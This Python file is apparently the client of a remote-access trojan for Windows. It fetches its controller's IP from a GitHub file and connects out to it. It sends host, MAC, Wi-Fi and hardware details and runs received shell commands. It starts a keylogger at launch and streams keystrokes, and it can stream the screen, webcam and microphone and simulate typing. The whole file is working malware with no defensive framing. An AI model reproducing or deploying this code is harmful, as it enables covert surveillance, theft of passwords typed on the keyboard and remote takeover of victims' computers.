listFileDepency = ['fct.py', 'scripter.py', 'sound.py']
hideFile = ["__pycache__"]
githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
import socket
def connected():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("www.google.com", 80))
        sock.close()
        return True
    except:
        sock.close()
        return False

import subprocess, os, time, threading, select, shutil
try:
    import requests as rq
except:
    subprocess.getoutput('py -m pip install requests', shell=True)
finally:
    import requests
try:
    import easyimporting
except:
    subprocess.getoutput("py -m pip install easyimporting", shell=True)
try:
    from file import File
except:
    if connected():
        with open("file.py", 'w'):
                pass
        with open("file.py", "a") as file:
            for line in requests.get(f"{githubUrl}file.py").text.split('\n'):
                file.write(line)
        from file import File
        os.system(os.path.basename(__file__))
        exit()
    else:
        exit()

f = File(os.getcwd().replace('\\', '/')+"/")
for file in hideFile:
    f.hide(file)
for file in listFileDepency:
    f.modify(file, githubUrl+file)
from fct import *
from sound import Sound
import scripter
s = Sound()


def getFileName():
    return os.path.basename(__file__)

def supDir(data):
    shutil.rmtree(data)
    
def downloadFileGithub(file_url, data=".zip"):
    with open(data,"wb") as zip	: 
        for chunk in (requests.get(file_url, stream = True)).iter_content(chunk_size=1024): 
             # writing one chunk at a time to zip file 
             if chunk: zip.write(chunk)
    unzipfile()

def unzipfile(file=".zip"):
    # ouvrir le fichier zip en mode lecture
    with zipfile.ZipFile(file, 'r') as zip: 
        # extraire tous les fichiers
        zip.extractall()
    os.remove(file)

def sortNameFile(data):
    from os.path import isfile, join
    return [f for f in os.listdir(data) if isfile(join(data, f))]

def moveFileFromDir(data, file):
    if type(file)==str:
        file = file.split()
    for f in range(len(file)):
        if file[f] != getFileName():
            shutil.copy(getpath(True)+"/"+data+"/"+file[f], getpath(True))


easyimporting.importing("PIL zipfile pyautogui lib_platform psutil", 'pillow')
import zipfile, psutil
try:
    import vidstream as vd
except:
    dir = "whl-main"
    downloadFileGithub("https://github.com/N0SAFE/whl/archive/refs/heads/main.zip")
    moveFileFromDir(dir, "PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
    supDir(dir)
    subprocess.getoutput("py -m pip install PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
    subprocess.getoutput("py -m pip install vidstream")
    os.remove("PyAudio-0.2.11-cp39-cp39-win_amd64.whl")

from vidstream import ScreenShareClient, CameraClient
import pyautogui, socket, lib_platform, pyaudio
from re import search

FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 4096
audio = pyaudio.PyAudio()

def getMacAddress():
    try:
        return search('([0-9A-F]{2}-?){6}', str(subprocess.Popen(['ipconfig', '/all'],stdout=subprocess.PIPE).stdout.read()).split('Carte r\\x82seau sans fil Wi-Fi')[1]).group()
    except:
        pass
    try:
        return search('([0-9A-F]{2}-?){6}', str(subprocess.Popen(['ipconfig', '/all'],stdout=subprocess.PIPE).stdout.read())).group()
    except:
        pass
    return 'unknow'

def camera(port):
    client = CameraClient(ipScreen, port)
    client.start_stream()
def screen(port):
    sender = ScreenShareClient(ipScreen, port)
    sender.start_stream()
def microphone(port, ip):
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serversocket.bind((ip, port))
    serversocket.listen(1)
    print('socket listen')
    print(port, ip)
    def callback(in_data, frame_count, time_info, status):
        for s in read_list[1:]:
            try:
                s.send(in_data)
            except:
                pass
        return (None, pyaudio.paContinue)
    try:
        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK, stream_callback=callback)
        read_list = [serversocket]
        try:
            while True:
                readable, writable, errored = select.select(read_list, [], [])
                for s in readable:
                    if s is serversocket:
                        (clientsocket, address) = serversocket.accept()
                        read_list.append(clientsocket)
                        print("socket accept")
                    else:
                        data = s.recv(1024)
                        if not data:
                            read_list.remove(s)
        except Exception as e:
            print(e)
            pass
        print('mic stop')
        try:
            serversocket.close()
        except:
            pass
        try:
            stream.stop_stream()
            stream.close()
        except:
            pass
    except:
        try:
            print('no mic')
            (clientsocket, address) = serversocket.accept()
            clientsocket.send('error'.encode())
        except:
            pass
        serversocket.close()
    
class GetBytesSize(object):
    # return the number in compressed bytes
    def __init__(self, bytes_=0, suffix="B"):
        self.suffix = suffix
        self.bytes_ = bytes_
        self.factor = 1024
        self.units = ["", "K", "M", "G", "T", "P"]
    def size_categorize(self):
        for unit in self.units:
            if self.bytes_ < self.factor:
                return f"{self.bytes_:.2f}{unit}{self.suffix}"
            self.bytes_ /= self.factor
    def __str__(self):
        return str(self.size_categorize())
    
# esential function
def terminal(command):
    return subprocess.Popen(command, shell=True,stdout=subprocess.PIPE).stdout.read().decode('ascii', "ignore")

def wallpaper(data):
    importImg(data)
    severalcmd('reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f 8!8RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True 8!8reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Imge.jpg'+' /f 8!8RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True8!8reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f 8!8RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True ')
    
def severalcmd(data, temp=0.05):
    datalist = data.split("8!8")
    for i in datalist:
        print(terminal(i))
        time.sleep(temp)

def stopall():
    subprocess.Popen(getSelfFileName(), shell=True)

        
def importImg(data):
    import urllib.request
    print(data)
    urllib.request.urlretrieve(data, "Image.jpg")

def cdAccess(cd):
    os.chdir(cd)
    
def write(text):
    pyautogui.write(text)
    
def press(key):
    if key == "winleft":
        pyautogui.press("winleft")
    elif key == "enter":
        pyautogui.press("enter")
    elif key == "tab":
        pyautogui.press("tab")
    elif key[0:10] == "backspace(":
        number = int(key[10:len(key) - 1])
        for i in range(number):
            pyautogui.press("backspace")

def receive(timeoutKill):
    global run, progrun
    while True:
        Socket.settimeout(timeoutKill)
        try:
            receive = (Socket.recv(2048).decode())
            print(receive)
        except:
            receive = "left"
            print('break')
        if receive == 'left':
            time.sleep(2)
            print(receive)
            run = False
        if receive == "die":
            print(receive)
            progrun = False
            run = False
        if receive != "9":
            return receive

QUEUKeylogger = []

def keylogger(stop):
    global QUEUKeylogger
    # save all logkey in a save.txt file
    print("other")
    from pynput.keyboard import Key, Listener
    print("test")
    def press(key):
        print(key)
        save(str(key).replace("'", ""))
    def save(key):
        with open("save.txt", "a") as file:
            if key.find("enter") > 0:
                QUEUKeylogger.append("w/145")
                file.write("\n")
            elif key.find("backspace") > 0:
                QUEUKeylogger.append("x/332")
                file.write("x/332")
            elif key.find("space") > 0:
                print("space")
                QUEUKeylogger.append(" ")
                file.write(" ")
            elif key.find("ctrl_l") > 0:
                QUEUKeylogger.append("")
                file.write("")
            elif key.find("ctrl_r") > 0:
                QUEUKeylogger.append("")
                file.write("")
            elif key.find("alt_l") > 0:
                QUEUKeylogger.append("")
                file.write("")
            elif key.find("ctrl_r") > 0:
                QUEUKeylogger.append("")
                file.write("")
            elif key.find("tab") > 0:
                QUEUKeylogger.append("    ")
                file.write("    ")
            elif key.find("key") == -1:
                QUEUKeylogger.append(key)
                file.write(key)
    def release(key):
        if stop():
            return False
    with Listener(on_press=press, on_release=release) as listener:
        listener.join()

sendListenKeylogger = False

def QueuKeyloggerEvent(stop):
    global sendListenKeylogger, QUEUKeylogger
    stop_threads = False
    threadingKeylogger = threading.Thread(target=keylogger, args =(lambda : stop_threads, ))
    threadingKeylogger.start()
    time.sleep(0.5)
    while True:
        time.sleep(0.001)
        if QUEUKeylogger:
            if sendListenKeylogger:
                print("".join(QUEUKeylogger).encode())
                Socket.send("".join(QUEUKeylogger).encode())
            QUEUKeylogger = []
        if stop():
            break
    stop_threads = True
    threadingKeylogger.join()

stop_Init_Keylogger = False
threadingInitKeylogger = threading.Thread(target=QueuKeyloggerEvent, args =(lambda : stop_Init_Keylogger, ))
threadingInitKeylogger.start()

def execute(data):
    global run, sortir, ossys, reloading, sendListenKeylogger
    data = data.replace("9", "")
    data = data.replace("1+8", "9")
    dataLoop = data.split("{-_-}")
    for data in dataLoop:
        datalist = data.split()
        if not datalist:
            return None
        if data == "die":
            return None
        elif data[0:2] == "cd":
            cdAccess(data[3:len(data)])
        elif data[0:6] == "write(":
            write(data[6:len(data) - 1])
        elif data[0:6] == "press(":
            press(data[6:len(data) - 1])
        elif datalist[0] == "screen":
            t = threading.Thread(target=screen, args=(int(datalist[1]),))
            t.daemon = True
            t.start()
        elif datalist[0] == "camera":
            t = threading.Thread(target=camera, args=(int(datalist[1]),))
            t.daemon = True
            t.start()
        elif datalist[0] == "microphone":
            t = threading.Thread(target=microphone, args=(int(datalist[1]), datalist[2],))
            t.daemon = True
            t.start()
        elif data == "left":
            print("restart")
            return None
        elif data[0:4] == "fast":
            scripter.speed_write(data[5:len(data)])
        elif data == "test":
            print("test")
        elif datalist[0] == "severalcmd":
            datalist.pop(0)
            data = " ".join(datalist)
            severalcmd(data)
        elif datalist[0] == "wallpaper":
            datalist.pop(0)
            data = " ".join(datalist)
            wallpaper(data)
        elif data == "listenKeyloggerTrue":
            sendListenKeylogger = True
        elif data == "listenKeyloggerFalse":
            sendListenKeylogger = False
        else:
            terminal(data)


run, progrun = True, True
timeoutKill = 20
try:
    with open('wifi.txt', 'r') as file:
        wifi = file.read()
except:
    wifi = 'unknow'
ram = ''
def get_size(bytes, suffix="B"):
    return GetBytesSize(bytes, suffix)
svmem = psutil.virtual_memory()
data = {"Total": get_size(svmem.total),
        "Available": get_size(svmem.available),
        "Used": get_size(svmem.used),
        "Percentage": svmem.percent}
swap = psutil.swap_memory()
for key, value in data.items():
    if key == "Percentage":
        ram += (f"{key} {value}%\n")
    else:
        ram += (f"{key} {value}\n")
def graphicInfo():
    list=easyimporting.importing("GPUtil tabulate")
    GPUtil = list[0]
    from tabulate import tabulate
    gpus = GPUtil.getGPUs()
    list_gpus = []
    if gpus:
        for gpu in gpus:
            gpu_id = gpu.id
            gpu_name = gpu.name
            gpu_load = f"{gpu.load*100}%"
            gpu_free_memory = f"{gpu.memoryFree}MB"
            gpu_used_memory = f"{gpu.memoryUsed}MB"
            gpu_total_memory = f"{gpu.memoryTotal}MB"
            gpu_temperature = f"{gpu.temperature} °C"
            gpu_uuid = gpu.uuid
            list_gpus.append((
                gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
                gpu_total_memory, gpu_temperature, gpu_uuid
            ))
        return str(tabulate(list_gpus, headers=("id", "name", "load", "free memory",
                        "used memory", "total memory", "temparature", "uuid"), tablefmt="pretty"))
    return "you haven't gpu"
cpu = ''
cpu += (f"Physical cores; {psutil.cpu_count(logical=False)}\n")
cpu += (f"Total cores; {psutil.cpu_count(logical=True)}\n")
cpufreq=psutil.cpu_freq()
cpu += (f"Max frequency; {cpufreq.max:.2f}Mhz\n")
cpu += (f"Min frequency; {cpufreq.min:.2f}Mhz\n")
cpu += (f"Current frequency; {cpufreq.current:.2f}Mhz\n")
cpu += ("CPU Usage per core;\n")
for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
    cpu += (f"Core {i}; {percentage}%\n")
cpu += (f"Total CPU Usage; {psutil.cpu_percent()}%\n")
while True:
    sendListenKeylogger = False
    ipScreen = f.getByGithub(f"{githubUrl}ip").replace("\n", "")
    print(ipScreen)
    print("ready")
    BREAK = False
    run = True
    try:
        Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Socket.connect((ipScreen, 9999))
        Socket.send(f'name:{str(lib_platform.hostname)}:mac:{getMacAddress()}:wifi:{wifi}:ram:{ram}:gpu:{graphicInfo()}:cpu:{cpu}'.encode())
    except:
        run = False
        pass
    if run:
        while True:
            execute(receive(timeoutKill))
            if run == False:
                break
        if not progrun:
            break
        Socket.close()
stop_Init_Keylogger = True
threadingInitKeylogger.join()
exit()
